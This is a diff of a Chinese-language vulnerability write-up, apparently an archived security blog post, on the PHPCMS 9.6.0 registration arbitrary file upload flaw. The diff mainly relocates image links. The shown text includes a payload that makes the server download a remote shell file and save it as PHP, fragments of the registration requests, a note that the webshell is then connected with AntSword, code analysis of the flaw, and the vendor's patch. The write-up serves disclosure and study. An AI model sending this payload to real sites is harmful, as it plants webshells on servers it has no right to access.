@@ -68,7 +68,7 @@ http://192.168.174.138/phpcms/index.php?m=member&c=index&a=register&siteid=1
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJfav6lzhRHucRDwm6YrEHT5Es1YHoQd0Z28byREiclhbyQmiaUrUjyoiaw/640?wx_fmt=png)
+![](../../.resource/remote/2b89b411194c3a8fffb1787e9bad2714b240c02ff3ac2b83b54d408c39468a19.png)
 
 之后发送到 repeater 模块，同时修改请求数据包中的请求数据为：
 
@@ -77,11 +77,11 @@ siteid=1&modelid=11&username=joe&password=123456&email=123qwe@qq.com&info[conten
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ6OHRbVRD9RpMwOtKiaLdhEKp6zzFS8AicnlfWtREgWWSa9SqukgTRA9Q/640?wx_fmt=png)
+![](../../.resource/remote/622da775f8506ec8e22e1afa061c04d2901f4c5603816015ed1e7cb421427ca8.png)
 
 文件成功上传
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ7c0JOzzutYbTlmtlJCTUktYK60NJPVzeibDs6jwz32R7AP70eaGKibRw/640?wx_fmt=png)
+![](../../.resource/remote/96c952827df86337eba5476ed8fffaf5fdcca3c8dc84860dffef909349612a0a.png)
 
 ##### 利用方式 2
 
@@ -92,49 +92,49 @@ siteid=1&modelid=11&username=Al1ex&password=1234567&email=1234@163.com&info[cont
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJDPGJvU2N7eQqFGTZJiau7GjQ1kp5QiaRVxvmQ5MS2NyYqtGM2nrqKibNg/640?wx_fmt=png)
+![](../../.resource/remote/33c07cad595d4c7bcc978fd5763536efec5619582d08d9a123c58f41707b12f3.png)
 
 之后更具目录去相关目录下查看文件，发现 webshell 确实已经被成功上传：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJciakhHiaehsYwyP25kXKTqjTs4qDzcTibmSWmXWRlvZmyn9lQ068TlMgA/640?wx_fmt=png)
+![](../../.resource/remote/792194c56ecd963736cb4524bd606c90aa050cfe53b1816da39c21ec71de7f09.png)
 
 之后使用蚁剑来连接：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJtibdejNiavtPyKy45oh04sbuZzCcxGKoOib3tCsjkG9sTkZkbsTnvtkYA/640?wx_fmt=png)
+![](../../.resource/remote/20af7214a060da813d8adef766cd17830d9d600edd429c1b63abf4df10456dc3.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ4t79qEMuQk08R1djbQibm7M5KllurtS4PNDNjerkKKVmUqnIumKEC3Q/640?wx_fmt=png)
+![](../../.resource/remote/65baa1161d57b21957b7b144658eac7b5629cf84c23daf20326d1e0154e479e2.png)
 
 #### 漏洞分析
 
 首先我们需要查看一下用户的注册功能 "phpcms/modules/member/index.php" 中的 register 函数：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ4r4OSc2dGic5u5eibiaedfejgib6mMvy7NAKYj6NnHS63SxUjfcN36wUIQ/640?wx_fmt=png)
+![](../../.resource/remote/86bd34f32cf24d9986562ec6458133fd08c4c2ff9790a05ba1f022b0b882876e.png)
 
 从上面的流程可以看到首先是获取用户的 siteid，之后定义了站点的 id 并加载了用户模块和短信模块的配置，之后通过对 "$_POST['dosubmit']" 是否为空进行判断来确定是否要进入用户注册流程当中，而我们这里自然是不为空了，所以我们继续跟进。之后通过查看代码我们可以看到对于用户的信息验证代码在 L129 行开始，同时我们之前在漏洞验证过程中的关键词 "info" 也出现了，我们继续跟进：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJDDCfQjMLfRunFQRv9D7wug6z4LIVMTd4dW3hXEkbYG0iapdkuS8rh4Q/640?wx_fmt=png)
+![](../../.resource/remote/b8dd11c577dc063a8dd8302fc3eb96355bf53ad6313e56e6192415f62da67c67.png)
 
 从上面的代码中我们可以看到对于 post 进的 info 信息首先通过 "new_html_special_chars" 来转义了一下 HTML 特殊字符，之后用将其传入到了 member_input 中，之后我们跟进 get 函数来看看：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJUEFUcUBMqicbV68ibQHdkMSjRWAaUK1c5UsicbfQKBsAQl4u3H9Q4RaXA/640?wx_fmt=png)
+![](../../.resource/remote/9568b6ee160dbd5d9f7149e3a9fea35d7d389915901c016b28bc60077c04e932.png)
 
 从上面可以看到这里首先通过 trim_sript 函数：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJZOk4MsCFJ7zfz3ChnChEiaWxIoWZUuZiarPpxZxNT0VXJMXFXdvato9A/640?wx_fmt=png)
+![](../../.resource/remote/1e186d523c26817527f59db49b05b3319ffe9613ff3644ff3b1dd00750b26a30.png)
 
 从函数功能来看这里只是对用户的输入的数据中的 javscript 代码进行了一次转义。  
 
 在 get 函数中有个关键的点就是 if(is_array($data))，我们 payload 中的 info 就是个数组，所以能走进这个 if 条件中，继续跟。 先是用 foreach 进行遍历 $info，键名为 $field，键值为 $value，首先用 safe_replace 进行了一次安全替换：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJQKlcu5jgtT3xNBBn34QCId0oOlrJEAOWgcNGZkQrsDjaTIpXBAibB1g/640?wx_fmt=png)
+![](../../.resource/remote/3380cf327fb88383aa4eb064978699a3675133c4c757c23b1fe34babbf33edb4.png)
 
 之后我们再次返回到 get 函数中，由于我们的 payload 是 info[content]，所以调用的是 editor 函数，同样在这个文件中：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ7wz5LB9FwQzmHfaDFeY9EgTyzgcBuhfIlu177nABMv3m0PV6Tw3Y0g/640?wx_fmt=png)
+![](../../.resource/remote/d9be548effade415fdee761af8cc03702c1d6966807dd5bd710be5ef2bd62e27.png)
 
 接下来函数执行 $this->attachment->download 函数进行下载，我们继续跟进，在 phpcms/libs/classes/attachment.class.php 中：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ9gswvSXPpPIzIoq6JcO6rSBjeQCoVQRboY3yXwsE6s3dBoMXsrhdnQ/640?wx_fmt=png)
+![](../../.resource/remote/1b5aaf9b03ef6a64fa1ff2cd73e3d88a66dc2aa99b6b26ebce35566abada236b.png)
 
 函数中先对 $value 中的引号进行了转义，然后使用正则匹配：
 
@@ -146,13 +146,13 @@ if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i",$string, $mat
 
 ```
 
-这里正则要求输入满足 src/href=url.(gif|jpg|jpeg|bmp|png)，我们的 payload （<img src=http://url/shell.txt?.php#.jpg>）符合这一格式（这也就是为什么后面要加. jpg 的原因）。接下来程序使用这行代码来去除 url 中的锚点：$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);，处理过后 $remotefileurls 的内容如下：
+这里正则要求输入满足 src/href=url.(gif|jpg|jpeg|bmp|png)，我们的 payload （` <img src=http://url/shell.txt?.php#.jpg> `）符合这一格式（这也就是为什么后面要加. jpg 的原因）。接下来程序使用这行代码来去除 url 中的锚点：$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);，处理过后 $remotefileurls 的内容如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJDG6vdkNQcbFMibGOaQicAXTdVXVia7gOlWYVd5iaI1M28d9eR8xQBdHXUw/640?wx_fmt=png)
+![](../../.resource/remote/1507f95905002dce774897c9c825efdcd7526944242f0c122841b8086b1afb32.png)
 
 可以看到 #.jpg 会被自动删除了，正因如此，下面的 $filename = fileext($file); 取的的后缀变成了 php，这也就是 PoC 中为什么要加 #的原因: 把前面为了满足正则而构造的. jpg 过滤掉，使程序获得我们真正想要的 php 文件后缀。随后在这一行带入了函数 fillurl：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ6HOqRwjaHF89oQJ5ys4HKjsQTRExEIFhvOp6XqTsBS3uiayWuPafo7Q/640?wx_fmt=png)
+![](../../.resource/remote/6270fc98b6024ceea786aafdf8477b9145d78c497c1ec2360b65b5925435accd.png)
 
 同时在 fillurl 中去掉了 #后的内容：
 
@@ -164,11 +164,11 @@ $pos = strpos($surl,'#');
 
 随后便进行下载：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJWImhd4Cric6I92RxusTjIqVHks4TUB72orWHrSpAic4ItATV4uZ4fgrA/640?wx_fmt=png)
+![](../../.resource/remote/f9d8b0f02504b1f946118a280a26ab4efb88aac9fa59b65cc9053b776c84cedd.png)
 
 其中 $upload_func 等同于 php 的 copy 函数。 然而：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ2kc4ibHlFtruetSYtuhw0kCicyUKia549RqIoDWEAtmbp9TiaQI2pumicvQ/640?wx_fmt=png)
+![](../../.resource/remote/116ae50bcaae1813fb842f3cd4124752c14b5df231ec7fdf677c13ebd88b12a2.png)
 
 而 fopen 一般都是可用的，如果开启了 allow_url_fopen，这个漏洞就构成了，然而大部分环境都默认开启了 allow_url_fopen。 
 
@@ -180,13 +180,13 @@ $pos = strpos($surl,'#');
 
 POC 完整脚本后台回复 "PHPCMS" 下载
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJfk0kMX8vz1uib26bjSBn2NZmCpe4GSKk9I98kkg25iaBXibicMqYwibIQFA/640?wx_fmt=png)
+![](../../.resource/remote/99f25b1ba498714231f3ac780309ff5701e3fdd7a80cb39c54444e4d715519c1.png)
 
 #### **修复建议**
 
  phpcms 发布了 9.6.1 版本，针对该漏洞的具体补丁如下, 在获取文件扩展名后再对扩展名进行检测
 
-![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJLFU5FgFfN4TzGN9lkJrOQ0aeAoJ83taomYne5WrwtRXfLiciaJzzgWNA/640?wx_fmt=png)
+![](../../.resource/remote/5377fcd6f3d5c66efcf551d0a03d41ae9f9d2b8064730aa30fedcddffce49d12.png)
 
 #### 参考链接
 
